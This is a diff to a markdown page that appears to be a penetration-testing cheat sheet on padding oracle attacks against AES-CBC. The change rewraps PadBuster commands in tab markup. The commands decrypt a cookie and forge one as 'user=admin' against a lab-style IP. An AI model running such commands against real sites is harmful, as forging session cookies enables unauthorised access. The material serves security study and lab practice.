@@ -5,9 +5,12 @@ tags: ["padding oracle", "padbuster", "aes", "cbc", "cipher", "encryption"]
 ---
 
 ---
-### padbuster
+### Tools
 
-[Download padbuster](https://github.com/AonCyberLabs/PadBuster)
+{{< tab set1 tab1 active >}}padbuster{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```bash
 # 8 or 16     : block size
@@ -19,5 +22,11 @@ padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<
 # Forge cookie value, e.g. user=admin
 padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
 ```
+
+</div>
+
+{{< /tabcontent >}}
+
+<small>*Ref: [Download padbuster](https://github.com/AonCyberLabs/PadBuster)*</small>
 
 <br>
